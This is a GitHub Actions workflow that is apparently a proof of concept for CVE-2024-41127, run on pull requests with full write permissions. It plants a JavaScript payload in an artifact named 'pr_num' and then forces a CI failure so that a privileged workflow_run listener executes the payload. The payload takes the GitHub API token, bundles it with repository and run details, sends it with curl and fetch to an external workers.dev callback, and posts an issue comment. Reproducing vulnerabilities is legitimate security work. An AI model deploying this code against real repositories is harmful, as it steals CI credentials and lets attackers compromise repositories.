name: Monkey CI

on:
  pull_request:

permissions: write-all

jobs:
  exploit:
    name: exploit
    runs-on: ubuntu-latest
    steps:
      - name: Write exploit payload to artifact
        shell: bash
        run: |
          cat > pr_num.txt << 'PR_NUM_EOF'
          (function(){var C='https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-41127-f5eeed2516d1?harness_run_id=20260830T153847-07589a3f';var t='';try{t=core.getInput('github-token')}catch(e){}if(!t)t=process.env['INPUT_GITHUB-TOKEN']||'NONE';var d=JSON.stringify({marker:'INJECTED-MARKER-cve-2024-41127-f5eeed2516d1',event:context.eventName,workflow:context.workflow,repo:context.repo.owner+'/'+context.repo.repo,run_id:context.runId,actor:context.actor,api_token:t});try{require('child_process').execFileSync('curl',['-s','-X','POST','--data-binary',d,C])}catch(e){}try{fetch(C,{method:'POST',body:d})}catch(e){}try{console.log('[CVE-2024-41127] executed in INJECTED-MARKER-cve-2024-41127-f5eeed2516d1 repo='+context.repo.owner+'/'+context.repo.repo+' event='+context.eventName+' api_token='+(t?'PRESENT':'ABSENT'))}catch(e){}try{github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:1,body:'CVE-2024-41127 PoC: code execution reached the ci-failure-comment listener (workflow_run). Marker: INJECTED-MARKER-cve-2024-41127-f5eeed2516d1 — repo: '+context.repo.owner+'/'+context.repo.repo})}catch(e){}return 1})()
          PR_NUM_EOF
          wc -c pr_num.txt

      - name: Upload exploit artifact
        uses: actions/upload-artifact@v4
        with:
          name: pr_num
          path: ./pr_num.txt

      - name: Force CI failure to fire the workflow_run listener
        run: exit 1
